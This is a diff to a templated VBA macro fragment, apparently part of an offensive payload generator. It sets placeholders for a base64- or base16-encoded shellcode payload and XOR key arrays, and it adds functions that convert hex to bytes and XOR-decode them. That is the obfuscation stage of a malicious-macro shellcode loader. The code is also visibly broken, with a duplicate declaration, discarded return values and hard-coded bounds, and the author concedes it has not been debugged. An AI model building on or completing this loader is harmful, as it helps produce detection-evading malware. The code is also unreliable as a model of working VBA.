@@ -1,8 +1,21 @@
-Dim intArray As Variant
-intArray = Array({{ intArray }})
+' README
+' I've had a lot of issues getting this to work and i can't be bothered debugging VBA as it's disgusting
+' but i've checked the XOR function and i'm fairly sure it's working correctly
 
-Dim hexArray As Variant
-hexArray = Array({{ hexArray }})
+Dim xorString as Variant
+xorString = "{{ xorStringValue }}"
+
+Dim xorKeyInt() as Variant
+xorKeyInt() = Array({{ xorIntArray }})
+
+Dim xorKeyHex() as Variant
+xorKeyHex() = Array({{ xorHexArray }})
+
+Dim intArray() As Variant
+intArray() = Array({{ intArray }})
+
+Dim hexArray() As Variant
+hexArray() = Array({{ hexArray }})
 
 ' ENCODED BASE64 PAYLOAD
 Dim encodedShellcode As String 
@@ -11,57 +24,30 @@ encodedShellcode = {{ base64EncodedPayload }}
 ' ENCODED BASE16 PAYLOAD
 Dim encodedShellcode As String 
 encodedShellcode = {{ base16EncodedPayload }}
+base16ToByteArray(encodedShellcode)
 
-' EVERYTHING AFTER HERE IS GARBAGE
-
-# opentechtips.com/base64-encoder-and-decoder-algorithm-from-scratch-in-python
-Function base64Decode(String s) As Dim()
-    if s[-2:] == "==":
-        s = s[0:-2] + "AA"
-        padding = 2
-    elif s[-1:] == "=":
-        s = s[0:-1] + "A"
-        padding = 1
-    else:
-        padding = 0
-
-    while i = 0 < len(s):
-        d = 0
-        for j in range(0,4,1):
-            d += base64chars.index(s[i]) << (18 - j * 6)
-            i += 1
-
-        decoded += chr (d >> 16) & 255
-
-        decoded += chr (d >> 8) & 255
-
-        decoded += chr (d & 255)
-
-    decoded = decoded[0:len(decoded) - padding]
-
-    print(decoded)
-End Function 
-
-
-
-Function xor(Dim() bytes, Dim() xorKey) As Dim()
-    Dim byteCount As Int
-    byteCount = UBound(bytes) - LBound(bytes) + 1
-    Dim xorKeyCount;
-    xorKeyCount = UBound(bytes) - LBound(bytes) + 1
-    Dim keyItr as Int 
-    
-    For i = 1 To byteCount
-        keyItr = i % xorKeyCount;
-        bytes(i) = bytes(i) Xor xorKey(keyItr)
-    Next i
-
-    xor = bytes
+Function base16ToByteArray(base16String As String) As Variant
+    Dim sbyte
+    Dim barray({{ byteCount+1 }}) As Variant
+    For counter = 1 To {{ byteCount+1 }}
+        sbyte = Mid(base16String, (counter * 2) - 1, 2)
+        barray(counter - 1) = Val("&H" & sbyte)
+    Next
+    base16ToByteArray = barray()
 End Function
 
-Dim bytes() as Byte 
+' harcoding some values here because vba is disgusting
+Function xorf(bytes() As Variant, xorbytes() As Variant) As Variant
+    
+    Dim keyItr As Integer
+    
+    For counter = 0 To {{ byteCount }}
+        keyItr = counter Mod {{ xorByteCount }}
+        bytes(counter) = bytes(counter) Xor xorbytes(keyItr)
+    Next
+    
+    xorf = bytes()
+End Function
 
-' TODO
-' 1. Base64 decryption function
-' 2. Base16 decryption function
-' 3. Test Int, Hex, Base64, Base16
+' i hate VBA
+xorf(intArray(), xorKeyInt())
